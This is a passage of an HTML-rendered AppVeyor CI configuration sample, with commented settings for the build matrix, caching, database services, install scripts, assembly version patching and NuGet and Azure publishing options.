&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  matrix:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  - db: mysql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    provider: mysql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  - db: mssql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    provider: mssql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    password:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      secure: $#(JFDA)jQ@#$&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# this is how to allow failing jobs in the matrix&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;matrix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;fast_finish&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# set this flag to immediately finish build once one of the jobs fails.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;allow_failures&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;platform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;x86&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Debug&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;platform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;x64&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Release&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# exclude configuration from the matrix. Works similarly to &amp;#39;allow_failures&amp;#39; but build not even being started for excluded combination.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;exclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;platform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;x86&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Debug&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# build cache to preserve files/folders between builds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;packages -&amp;gt; **\packages.config  # preserve &amp;#34;packages&amp;#34; directory in the root of build folder but will reset it if packages.config is modified&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;projectA\libs&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;node_modules                    # local npm modules&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;s1&#34;&gt;&amp;#39;%LocalAppData%\NuGet\Cache&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# NuGet &amp;lt; v3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;s1&#34;&gt;&amp;#39;%LocalAppData%\NuGet\v3-cache&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# NuGet v3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# enable service required for build/tests&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;services&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mssql2014           # start SQL Server 2014 Express&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mssql2014rs         # start SQL Server 2014 Express and Reporting Services&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mssql2012sp1        # start SQL Server 2012 SP1 Express&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mssql2012sp1rs      # start SQL Server 2012 SP1 Express and Reporting Services&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mssql2008r2sp2      # start SQL Server 2008 R2 SP2 Express&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mssql2008r2sp2rs    # start SQL Server 2008 R2 SP2 Express and Reporting Services&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mysql               # start MySQL 5.6 service&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;postgresql          # start PostgreSQL 9.5 service&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;iis                 # start IIS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;msmq                # start Queuing services&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;mongodb             # start MongoDB&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts that run after cloning repository&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;install&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# by default, all script lines are interpreted as batch&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo This is batch&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run script as a PowerShell command prepend it with ps:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;ps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Write-Host &amp;#39;This is PowerShell&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# batch commands start from cmd:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;echo This is batch again&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;set MY_VAR=12345&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# enable patching of AssemblyInfo.* files&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;assembly_info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;patch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;AssemblyInfo.*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;assembly_version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2.2.{build}&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;assembly_file_version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{version}&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;assembly_informational_version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{version}&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Automatically register private account and/or project AppVeyor NuGet feeds.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nuget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;account_feed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;project_feed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;disable_publish_on_pr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# disable publishing of .nupkg artifacts to account/project feeds for pull request builds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_wap_octopus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# disable publishing of Octopus Deploy .nupkg artifacts to account/project feeds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#       build configuration       #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# build platform, i.e. x86, x64, Any CPU. This setting is optional.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;platform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Any CPU&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to add several platforms to build matrix:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#platform:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  - x86&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  - Any CPU&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# build Configuration, i.e. Debug, Release, etc.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Release&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to add several configurations to build matrix:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#configuration:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  - Debug&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  - Release&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Build settings, not to be confused with &amp;#34;before_build&amp;#34; and &amp;#34;after_build&amp;#34;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# &amp;#34;project&amp;#34; is relative to the original build directory and not influenced by directory changes in &amp;#34;before_build&amp;#34;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;parallel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# enable MSBuild parallel builds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;project&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;MyTestAzureCS.sln      # path to Visual Studio solution or project&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_wap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# package Web Application Projects (WAP) for Web Deploy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_wap_xcopy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# package Web Application Projects (WAP) for XCopy deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_wap_beanstalk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Package Web Applications for AWS Elastic Beanstalk deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_wap_octopus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Package Web Applications for Octopus deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_azure_webjob&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Package Azure WebJobs for Zip Push deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_azure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# package Azure Cloud Service projects and push to artifacts&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_aspnet_core&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Package ASP.NET Core projects&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_core_console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Package .NET Core console projects&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_nuget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# package projects with .nuspec files and push to artifacts&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;publish_nuget_symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# generate and publish NuGet symbol packages&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
